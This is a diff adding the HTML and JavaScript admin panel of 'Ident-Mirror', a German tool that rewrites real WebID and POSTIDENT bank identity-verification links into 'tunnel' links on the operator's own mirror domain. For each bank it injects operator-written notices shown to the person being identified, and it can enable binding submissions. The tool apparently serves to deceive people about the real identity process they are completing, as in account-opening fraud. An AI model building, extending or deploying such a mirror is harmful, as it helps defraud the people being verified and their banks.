@@ -1,0 +1,357 @@
+<!doctype html>
+<html lang="de" class="dark">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<meta name="robots" content="noindex, nofollow" />
+<title>Ident-Mirror Admin</title>
+<style>
+  :root{--bg:#0b0d12;--panel:#14171f;--border:#232838;--text:#e8eaf0;--muted:#9aa3b2;--accent:#0a66c2;--accent-2:#123a5e;--danger:#c2402a}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--text);font:15px/1.55 -apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif}
+  header{display:flex;align-items:center;gap:10px;padding:14px 22px;border-bottom:1px solid var(--border)}
+  header .brand{font-weight:700;font-size:17px}
+  header .tag{background:#1c2230;border:1px solid var(--border);color:var(--muted);border-radius:6px;padding:1px 8px;font-size:12px}
+  header .right{margin-left:auto;color:var(--muted);font-size:13px}
+  header .right a{color:var(--muted);margin-left:14px;cursor:pointer;text-decoration:underline}
+  main{max-width:960px;margin:0 auto;padding:22px}
+  .tabs{display:inline-flex;background:#171b25;border:1px solid var(--border);border-radius:10px;padding:4px;gap:2px;margin-bottom:18px}
+  .tabs button{background:transparent;border:0;color:var(--muted);padding:8px 18px;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer}
+  .tabs button.active{background:#262c3a;color:#fff}
+  .card{background:var(--panel);border:1px solid var(--border);border-radius:14px;padding:26px;margin-bottom:18px}
+  .card h2{margin:0 0 4px;font-size:17px}
+  .card .sub{color:var(--muted);font-size:13.5px;margin:0 0 18px}
+  label{display:block;font-weight:600;font-size:13.5px;margin:14px 0 6px}
+  input[type=text],input[type=password],textarea,select{width:100%;background:#0e1118;border:1px solid var(--border);border-radius:8px;color:var(--text);padding:10px 12px;font:inherit}
+  textarea{min-height:110px;resize:vertical}
+  .row{display:flex;gap:12px;align-items:flex-end}
+  .row>*{flex:1}
+  .btn{background:var(--accent);color:#fff;border:0;border-radius:8px;padding:10px 18px;font-weight:600;font-size:14px;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+  .btn.secondary{background:#1c2230;border:1px solid var(--border);color:var(--text)}
+  .btn.danger{background:transparent;border:1px solid var(--danger);color:var(--danger)}
+  .btn:disabled{opacity:.5;cursor:default}
+  .note{margin-top:16px;padding-top:14px;border-top:1px solid var(--border);color:var(--muted);font-size:13px}
+  code{background:#1c2230;border-radius:5px;padding:2px 7px;font-size:12.5px}
+  .msg{margin:10px 0;padding:10px 14px;border-radius:8px;font-size:13.5px}
+  .msg.ok{background:#0f2a1a;border:1px solid #1f5c38;color:#7bd8a0}
+  .msg.err{background:#2a1414;border:1px solid #6b2b2b;color:#ff9d8a}
+  .proc{border:1px solid var(--border);border-radius:12px;padding:18px;margin-bottom:14px;background:#10131b}
+  .proc h3{margin:0 0 2px;font-size:15px}
+  .proc .badge{background:var(--accent-2);border:1px solid #2b5d8a;color:#7cc0ff;border-radius:6px;padding:1px 8px;font-size:12px;margin-left:8px}
+  .proc .key{color:var(--muted);font-size:12.5px;margin:0 0 12px}
+  .proc .actions{display:flex;gap:10px;margin-top:12px}
+  .checkbox{display:flex;gap:8px;align-items:center;margin-top:14px;font-size:13.5px;color:var(--muted)}
+  .checkbox input{width:auto}
+  .tunnel-result{margin-top:16px;display:none}
+  .tunnel-result.show{display:block}
+  .tunnel-result a{color:#7cc0ff;word-break:break-all}
+  .hidden{display:none}
+  .login-wrap{max-width:420px;margin:10vh auto}
+</style>
+</head>
+<body>
+<header>
+  <span class="brand" id="brand">Ident-Mirror</span>
+  <span class="tag">Standalone</span>
+  <span class="right">Admin-Panel <a id="logout" class="hidden">Abmelden</a></span>
+</header>
+<main>
+  <!-- Login / Erst-Setup -->
+  <div id="loginView" class="login-wrap hidden">
+    <div class="card">
+      <h2 id="loginTitle">Anmelden</h2>
+      <p class="sub" id="loginSub">Bitte mit dem Admin-Passwort anmelden.</p>
+      <label for="pw">Passwort</label>
+      <input type="password" id="pw" autocomplete="current-password" />
+      <div style="margin-top:16px"><button class="btn" id="loginBtn">Anmelden</button></div>
+      <div id="loginMsg"></div>
+    </div>
+  </div>
+
+  <!-- Panel -->
+  <div id="panelView" class="hidden">
+    <div class="tabs">
+      <button data-tab="tunnel" class="active">Tunnel</button>
+      <button data-tab="texts">Hinweis-Texte</button>
+      <button data-tab="settings">Einstellungen</button>
+    </div>
+
+    <!-- Tunnel -->
+    <section id="tab-tunnel">
+      <div class="card">
+        <h2>Link-Tunnel</h2>
+        <p class="sub">Ident-Link einfügen und Vorgang wählen – der Hinweis passend zum Vorgang wird eingeblendet.</p>
+        <label for="identLink">Ident-Link</label>
+        <input type="text" id="identLink" placeholder="https://webid-gateway.de/service/... oder https://postident.deutschepost.de/user/start/..." />
+        <label for="procSelect">Vorgang (Bank/Verfahren)</label>
+        <div class="row">
+          <select id="procSelect"></select>
+          <span class="badge" id="procProvider" style="flex:0 0 auto;align-self:center;background:var(--accent-2);border:1px solid #2b5d8a;color:#7cc0ff;border-radius:6px;padding:2px 10px;font-size:12.5px"></span>
+        </div>
+        <div style="margin-top:16px"><button class="btn" id="openTunnel">⧉ Im Tunnel öffnen</button>
+        <button class="btn secondary" id="copyTunnel">Link kopieren</button></div>
+        <div class="tunnel-result" id="tunnelResult">
+          <label>Tunnel-Link</label>
+          <a id="tunnelUrl" href="#" target="_blank" rel="noopener"></a>
+        </div>
+        <div id="tunnelMsg"></div>
+        <div class="note">Mirror-Adresse dieser Installation: <code id="mirrorAddr">…</code></div>
+      </div>
+    </section>
+
+    <!-- Hinweis-Texte -->
+    <section id="tab-texts" class="hidden">
+      <div class="card">
+        <h2>Hinweis-Texte</h2>
+        <p class="sub">Pro Bank/Verfahren ein Hinweis. Er wird dem Teilnehmer im Tunnel eingeblendet, bevor es weitergeht.</p>
+        <div id="procList"></div>
+        <button class="btn secondary" id="addProc">+ Neuer Vorgang</button>
+        <div style="margin-top:18px"><button class="btn" id="saveProcs">Hinweis-Texte speichern</button></div>
+        <div id="textsMsg"></div>
+      </div>
+    </section>
+
+    <!-- Einstellungen -->
+    <section id="tab-settings" class="hidden">
+      <div class="card">
+        <h2>Allgemein</h2>
+        <p class="sub">Grundeinstellungen des Mirrors. Wirkt sofort nach dem Speichern.</p>
+        <label for="company">Firmenname</label>
+        <input type="text" id="company" />
+        <label for="publicUrl">Öffentliche Mirror-URL (leer = automatisch)</label>
+        <input type="text" id="publicUrl" placeholder="https://mirror.example.de" />
+        <div style="margin-top:18px"><button class="btn" id="saveSettings">Einstellungen speichern</button></div>
+        <div id="settingsMsg"></div>
+      </div>
+      <div class="card">
+        <h2>Admin-Passwort ändern</h2>
+        <label for="pwCurrent">Aktuelles Passwort</label>
+        <input type="password" id="pwCurrent" autocomplete="current-password" />
+        <label for="pwNext">Neues Passwort (mind. 8 Zeichen)</label>
+        <input type="password" id="pwNext" autocomplete="new-password" />
+        <div style="margin-top:18px"><button class="btn" id="changePw">Passwort ändern</button></div>
+        <div id="pwMsg"></div>
+      </div>
+    </section>
+  </div>
+</main>
+
+<script>
+const $ = (id) => document.getElementById(id);
+let cfg = null;
+
+function msg(el, text, ok) {
+  el.className = "msg " + (ok ? "ok" : "err");
+  el.textContent = text;
+  setTimeout(() => { el.className = ""; el.textContent = ""; }, 5000);
+}
+
+async function api(path, body) {
+  const res = await fetch(path, {
+    method: body ? "POST" : "GET",
+    headers: body ? { "content-type": "application/json" } : {},
+    body: body ? JSON.stringify(body) : undefined,
+    credentials: "same-origin",
+  });
+  const data = await res.json().catch(() => ({}));
+  return { status: res.status, data };
+}
+
+// ── Login ─────────────────────────────────────────────────────────────────
+async function boot() {
+  const { status, data } = await api("/_admin/api/config");
+  if (status === 200) { cfg = data; showPanel(); return; }
+  if (data.error === "no_password_set") {
+    $("loginTitle").textContent = "Willkommen – Passwort festlegen";
+    $("loginSub").textContent = "Noch ist kein Admin-Passwort gesetzt. Bitte jetzt eines festlegen (mind. 8 Zeichen).";
+    $("loginBtn").textContent = "Passwort setzen";
+    $("pw").autocomplete = "new-password";
+    $("loginBtn").onclick = setupPassword;
+  } else {
+    $("loginBtn").onclick = login;
+  }
+  $("loginView").classList.remove("hidden");
+}
+
+async function login() {
+  const { status, data } = await api("/_admin/api/login", { password: $("pw").value });
+  if (status === 200 && data.ok) { location.reload(); return; }
+  if (data.error === "no_password_set") { location.reload(); return; }
+  msg($("loginMsg"), "Passwort falsch.", false);
+}
+
+async function setupPassword() {
+  const pw = $("pw").value;
+  if (pw.length < 8) return msg($("loginMsg"), "Mindestens 8 Zeichen.", false);
+  const { status } = await api("/_admin/api/setup-password", { password: pw });
+  if (status === 200) { location.reload(); return; }
+  msg($("loginMsg"), "Konnte nicht gespeichert werden.", false);
+}
+
+$("logout").onclick = async () => { await api("/_admin/api/logout", {}); location.reload(); };
+
+// ── Panel ─────────────────────────────────────────────────────────────────
+function showPanel() {
+  $("loginView").classList.add("hidden");
+  $("panelView").classList.remove("hidden");
+  $("logout").classList.remove("hidden");
+  $("brand").textContent = cfg.company_name || "Ident-Mirror";
+  $("mirrorAddr").textContent = cfg.public_url || location.origin;
+  $("company").value = cfg.company_name || "";
+  $("publicUrl").value = cfg.public_url || "";
+  renderProcSelect();
+  renderProcList();
+}
+
+// Tabs
+document.querySelectorAll(".tabs button").forEach((b) => {
+  b.onclick = () => {
+    document.querySelectorAll(".tabs button").forEach((x) => x.classList.toggle("active", x === b));
+    ["tunnel", "texts", "settings"].forEach((t) => $("tab-" + t).classList.toggle("hidden", t !== b.dataset.tab));
+  };
+});
+
+// ── Tunnel ────────────────────────────────────────────────────────────────
+const PROVIDER_LABEL = { webid: "WebID", postident: "POSTIDENT" };
+
+function renderProcSelect() {
+  const sel = $("procSelect");
+  sel.innerHTML = "";
+  (cfg.procedures || []).forEach((p) => {
+    const o = document.createElement("option");
+    o.value = p.key;
+    o.textContent = p.label + " (" + (PROVIDER_LABEL[p.provider] || p.provider) + ")";
+    sel.appendChild(o);
+  });
+  updateProviderBadge();
+  sel.onchange = updateProviderBadge;
+}
+function updateProviderBadge() {
+  const p = (cfg.procedures || []).find((x) => x.key === $("procSelect").value);
+  $("procProvider").textContent = p ? (PROVIDER_LABEL[p.provider] || p.provider) : "–";
+}
+
+function buildTunnelUrl() {
+  const raw = $("identLink").value.trim();
+  const key = $("procSelect").value;
+  if (!key) return { error: "Bitte zuerst unter „Hinweis-Texte“ einen Vorgang anlegen." };
+  let u;
+  try { u = new URL(raw); } catch { return { error: "Bitte einen gültigen Ident-Link einfügen." } }
+  const p = cfg.procedures.find((x) => x.key === key);
+  const expectedHost = p.provider === "postident" ? "postident.deutschepost.de" : "webid-gateway.de";
+  if (u.host !== expectedHost && !u.host.endsWith("." + expectedHost)) {
+    return { error: "Der Link passt nicht zum Anbieter dieses Vorgangs (" + expectedHost + ")." };
+  }
+  const base = (cfg.public_url || location.origin).replace(/\/+$/, "");
+  return { url: base + "/t/" + key + u.pathname + u.search };
+}
+
+$("openTunnel").onclick = () => {
+  const r = buildTunnelUrl();
+  if (r.error) return msg($("tunnelMsg"), r.error, false);
+  $("tunnelUrl").href = r.url;
+  $("tunnelUrl").textContent = r.url;
+  $("tunnelResult").classList.add("show");
+  window.open(r.url, "_blank", "noopener");
+};
+$("copyTunnel").onclick = async () => {
+  const r = buildTunnelUrl();
+  if (r.error) return msg($("tunnelMsg"), r.error, false);
+  $("tunnelUrl").href = r.url;
+  $("tunnelUrl").textContent = r.url;
+  $("tunnelResult").classList.add("show");
+  try { await navigator.clipboard.writeText(r.url); msg($("tunnelMsg"), "Link kopiert.", true); }
+  catch { msg($("tunnelMsg"), "Kopieren nicht möglich – Link bitte manuell markieren.", false); }
+};
+
+// ── Hinweis-Texte ─────────────────────────────────────────────────────────
+function procCard(p) {
+  const div = document.createElement("div");
+  div.className = "proc";
+  div.innerHTML = `
+    <h3>${escapeHtml(p.label || "Neuer Vorgang")}<span class="badge">${PROVIDER_LABEL[p.provider] || "WebID"}</span></h3>
+    <p class="key">Schlüssel: ${escapeHtml(p.key || "–")}</p>
+    <div class="row">
+      <div><label>Bezeichnung (Bank/Verfahren)</label><input type="text" data-f="label" value="${escapeAttr(p.label)}"></div>
+      <div><label>Schlüssel (klein, z. B. dkb)</label><input type="text" data-f="key" value="${escapeAttr(p.key)}" ${p._saved ? "disabled" : ""}></div>
+      <div style="flex:0 0 170px"><label>Anbieter</label><select data-f="provider">
+        <option value="webid" ${p.provider === "webid" ? "selected" : ""}>WebID</option>
+        <option value="postident" ${p.provider === "postident" ? "selected" : ""}>POSTIDENT</option>
+      </select></div>
+    </div>
+    <label>Titel</label><input type="text" data-f="title" value="${escapeAttr(p.title)}">
+    <label>Text</label><textarea data-f="text">${escapeHtml(p.text)}</textarea>
+    <label>Meta-Zeile (klein, optional)</label><input type="text" data-f="meta" value="${escapeAttr(p.meta)}">
+    <div class="checkbox"><input type="checkbox" data-f="allow_submit" ${p.allow_submit ? "checked" : ""}> Verbindliche Aktionen (Absenden) für diesen Vorgang freigeben</div>
+    <div class="actions"><button class="btn danger" data-act="del">Löschen</button></div>`;
+  div.querySelector('[data-act="del"]').onclick = () => { div.remove(); };
+  div.querySelectorAll("input,select,textarea").forEach((el) => {
+    el.addEventListener("input", () => {
+      const get = (f) => div.querySelector(`[data-f="${f}"]`);
+      div.querySelector("h3").firstChild.textContent = get("label").value || "Neuer Vorgang";
+      div.querySelector(".key").textContent = "Schlüssel: " + (get("key").value || "–");
+      div.querySelector(".badge").textContent = PROVIDER_LABEL[get("provider").value] || "WebID";
+    });
+  });
+  return div;
+}
+
+function renderProcList() {
+  const list = $("procList");
+  list.innerHTML = "";
+  (cfg.procedures || []).forEach((p) => list.appendChild(procCard({ ...p, _saved: true })));
+}
+
+$("addProc").onclick = () => $("procList").appendChild(procCard({ key: "", label: "", provider: "webid", title: "", text: "", meta: "", allow_submit: false }));
+
+$("saveProcs").onclick = async () => {
+  const procs = [];
+  for (const div of $("procList").children) {
+    const get = (f) => div.querySelector(`[data-f="${f}"]`);
+    procs.push({
+      key: get("key").value.trim().toLowerCase(),
+      label: get("label").value.trim(),
+      provider: get("provider").value,
+      title: get("title").value,
+      text: get("text").value,
+      meta: get("meta").value,
+      allow_submit: get("allow_submit").checked,
+    });
+  }
+  const { status, data } = await api("/_admin/api/config", { procedures: procs });
+  if (status === 200) {
+    cfg.procedures = procs;
+    renderProcSelect();
+    renderProcList();
+    msg($("textsMsg"), "Gespeichert.", true);
+  } else {
+    msg($("textsMsg"), "Fehler: " + (data.error || "unbekannt"), false);
+  }
+};
+
+// ── Einstellungen ─────────────────────────────────────────────────────────
+$("saveSettings").onclick = async () => {
+  const { status } = await api("/_admin/api/config", { company_name: $("company").value, public_url: $("publicUrl").value });
+  if (status === 200) {
+    cfg.company_name = $("company").value || "Ident-Mirror";
+    cfg.public_url = $("publicUrl").value.trim();
+    $("brand").textContent = cfg.company_name;
+    $("mirrorAddr").textContent = cfg.public_url || location.origin;
+    msg($("settingsMsg"), "Gespeichert.", true);
+  } else msg($("settingsMsg"), "Speichern fehlgeschlagen.", false);
+};
+
+$("changePw").onclick = async () => {
+  const { status, data } = await api("/_admin/api/password", { current: $("pwCurrent").value, next: $("pwNext").value });
+  if (status === 200) { $("pwCurrent").value = ""; $("pwNext").value = ""; msg($("pwMsg"), "Passwort geändert.", true); }
+  else msg($("pwMsg"), data.error === "min_8" ? "Neues Passwort: mindestens 8 Zeichen." : "Aktuelles Passwort falsch.", false);
+};
+
+function escapeHtml(s) { return String(s ?? "").replace(/[&<>"]/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;" })[c]); }
+function escapeAttr(s) { return escapeHtml(s); }
+
+$("pw").addEventListener("keydown", (e) => { if (e.key === "Enter") $("loginBtn").click(); });
+boot();
+</script>
+</body>
+</html>
